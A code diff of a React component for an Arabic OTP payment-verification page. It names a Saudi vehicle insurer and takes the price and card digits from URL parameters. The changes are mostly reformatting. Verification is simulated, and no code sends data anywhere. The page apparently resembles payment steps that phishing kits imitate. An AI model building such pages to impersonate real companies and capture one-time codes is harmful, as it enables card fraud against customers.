@@ -2,86 +2,66 @@ import { useState } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
 import { Input } from "@/components/ui/input";
 import { useToast } from "@/hooks/use-toast";
-import {
-  Accordion,
-  AccordionContent,
-  AccordionItem,
-  AccordionTrigger,
-} from "@/components/ui/accordion";
-
+import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";
 const OtpVerification = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
-  const { toast } = useToast();
-  
+  const {
+    toast
+  } = useToast();
   const companyName = searchParams.get("company") || "شركة الاتحاد للتأمين التعاوني - تأمين على المركبات ضد الغير";
   const price = searchParams.get("price") || "411.15";
   const cardLast4 = searchParams.get("cardLast4") || "6636";
-
   const [otp, setOtp] = useState("");
   const [isLoading, setIsLoading] = useState(false);
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
     if (otp.length !== 6) {
       toast({
         title: "خطأ",
         description: "الرجاء إدخال رمز التحقق المكون من 6 أرقام",
-        variant: "destructive",
+        variant: "destructive"
       });
       return;
     }
-
     setIsLoading(true);
-    
+
     // Simulate OTP verification
     setTimeout(() => {
       setIsLoading(false);
       toast({
         title: "تم التحقق بنجاح",
-        description: "تم إتمام عملية الدفع بنجاح",
+        description: "تم إتمام عملية الدفع بنجاح"
       });
     }, 1500);
   };
-
   const handleResendCode = () => {
     toast({
       title: "تم إعادة الإرسال",
-      description: "تم إرسال رمز تحقق جديد إلى هاتفك",
+      description: "تم إرسال رمز تحقق جديد إلى هاتفك"
     });
   };
-
-  const currentTime = new Date().toLocaleString('ar-SA', { 
-    day: '2-digit', 
-    month: '2-digit', 
+  const currentTime = new Date().toLocaleString('ar-SA', {
+    day: '2-digit',
+    month: '2-digit',
     year: 'numeric',
     hour: '2-digit',
     minute: '2-digit',
     second: '2-digit',
     hour12: false
   });
-
-  return (
-    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4" dir="rtl">
+  return <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4" dir="rtl">
       <div className="w-full max-w-2xl bg-white border border-gray-300 rounded-lg shadow-sm p-6 animate-fade-in">
         {/* Cancel Button */}
         <div className="text-left mb-4">
-          <button
-            onClick={() => navigate(-1)}
-            className="text-gray-600 hover:underline text-sm"
-          >
+          <button onClick={() => navigate(-1)} className="text-gray-600 hover:underline text-sm">
             إلغاء
           </button>
         </div>
 
         {/* Card Image */}
         <div className="flex justify-center mb-4">
-          <img 
-            src="/placeholder.svg" 
-            alt="Card" 
-            className="w-24 h-16 object-contain"
-          />
+          
         </div>
 
         {/* Divider */}
@@ -127,33 +107,17 @@ const OtpVerification = () => {
             <div className="text-center text-gray-600 mb-2 text-sm">
               رمز التحقق
             </div>
-            <Input
-              type="text"
-              maxLength={6}
-              value={otp}
-              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
-              className="w-full text-center text-lg tracking-widest py-2 outline-none border-0 border-b-2 border-gray-300 focus-visible:ring-0 focus-visible:border-gray-600 rounded-none"
-              placeholder=""
-              dir="ltr"
-            />
+            <Input type="text" maxLength={6} value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, ''))} className="w-full text-center text-lg tracking-widest py-2 outline-none border-0 border-b-2 border-gray-300 focus-visible:ring-0 focus-visible:border-gray-600 rounded-none" placeholder="" dir="ltr" />
           </div>
 
-          <button
-            type="submit"
-            className="w-full py-3 bg-[#2900fc] hover:bg-[#2200cc] text-white font-medium transition-colors rounded"
-            disabled={isLoading || otp.length !== 6}
-          >
+          <button type="submit" className="w-full py-3 bg-[#2900fc] hover:bg-[#2200cc] text-white font-medium transition-colors rounded" disabled={isLoading || otp.length !== 6}>
             {isLoading ? "جاري التحقق..." : "تأكيد"}
           </button>
         </form>
 
         {/* Resend Code */}
         <div className="mt-12 text-center">
-          <button
-            type="button"
-            onClick={handleResendCode}
-            className="text-[#2900fc] hover:underline"
-          >
+          <button type="button" onClick={handleResendCode} className="text-[#2900fc] hover:underline">
             إعادة إرسال الرمز
           </button>
         </div>
@@ -181,8 +145,6 @@ const OtpVerification = () => {
           </Accordion>
         </div>
       </div>
-    </div>
-  );
+    </div>;
 };
-
 export default OtpVerification;
